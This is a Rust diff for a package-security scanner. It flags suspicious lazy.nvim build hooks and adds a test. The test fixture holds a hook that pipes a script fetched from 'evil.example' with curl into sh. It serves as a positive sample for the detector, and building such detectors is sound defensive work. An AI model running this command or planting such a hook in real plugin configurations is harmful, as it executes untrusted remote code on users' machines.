@@ -161,6 +161,23 @@ fn fingerprint_inner(
     // go-retract) have Deps / Hooks / retract data, not just raw files.
     let normalized = build_normalized(files, pkg_name, version, eco);
     let mut caps = findings.capabilities();
+    let mut evidence = findings.evidence().to_vec();
+    // Hook scripts declared in source (lazy.nvim `build = "..."`) get the
+    // same matcher as npm lifecycle scripts. A benign `build = ":TSUpdate"`
+    // does not trip it, so only a match is a capability.
+    for h in findings.hook_scripts() {
+        if aegis_heuristics::install_hook::script_matches_malware_pattern(&h.body) {
+            caps.push(Capability::InstallHookSuspicious);
+            if collect_evidence {
+                evidence.push(Evidence {
+                    capability: Capability::InstallHookSuspicious,
+                    path: h.path.clone(),
+                    line: h.line,
+                    snippet: h.body.clone(),
+                });
+            }
+        }
+    }
     caps.extend(run_heuristics(&normalized));
     caps.extend(extra_caps);
 
@@ -181,7 +198,7 @@ fn fingerprint_inner(
             source_size_bytes: source_bytes,
             hooks,
         },
-        findings.evidence().to_vec(),
+        evidence,
     )
 }
 
@@ -770,6 +787,28 @@ mod tests {
     use super::*;
     use aegis_domain::Reachability;
     use std::sync::atomic::{AtomicU64, Ordering};
+
+    #[test]
+    fn lua_build_hook_is_flagged_only_when_the_script_looks_malicious() {
+        let caps = |spec: &str| {
+            fingerprint_source(
+                &[("lua/plugins/x.lua".to_string(), spec.as_bytes().to_vec())],
+                "x.nvim",
+                "",
+                Ecosystem::Neovim,
+                vec![],
+            )
+            .capabilities
+        };
+        assert!(
+            caps(r#"return { "a/x.nvim", build = "curl -s https://evil.example/p.sh | sh" }"#)
+                .has(Capability::InstallHookSuspicious)
+        );
+        assert!(
+            !caps(r#"return { "nvim-treesitter/nvim-treesitter", build = ":TSUpdate" }"#)
+                .has(Capability::InstallHookSuspicious)
+        );
+    }
 
     #[test]
     fn go_retract_fires_when_the_version_is_known() {
